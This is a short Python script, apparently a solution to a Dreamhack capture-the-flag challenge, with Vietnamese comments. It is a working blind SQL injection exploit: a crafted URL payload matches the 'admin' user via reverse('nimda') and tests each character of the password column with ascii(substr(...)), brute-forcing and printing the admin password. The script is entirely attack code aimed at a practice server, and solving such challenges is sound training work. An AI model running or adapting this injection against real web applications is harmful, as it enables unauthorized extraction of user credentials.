import requests
import time

url_template = "http://host8.dreamhack.games:16784/?uid='||uid%3Dreverse(\"nimda\")%26%26if(ascii(substr(upw%2C{i}%2C1))%3D{j}%2Ctrue%2Cfalse)%23"

flag = ""
for i in range(1, 50):  # vị trí ký tự trong mật khẩu
    found = False
    for j in range(32, 128):  # ký tự in được
        url = url_template.format(i=i, j=j)
        try:
            res = requests.get(url, timeout=5)
            if 'admin' in res.text:
                flag += chr(j)
                print(f"[+] Found char at pos {i}: {chr(j)} → {flag}")
                found = True
                break
        except requests.exceptions.RequestException as e:
            print(f"[!] Error at i={i}, j={j}: {e}")
            time.sleep(1)
    if not found:
        print(f"[x] No valid character found at position {i}. Assuming end of password.")
        break

print(f"[✓] Final password: {flag}")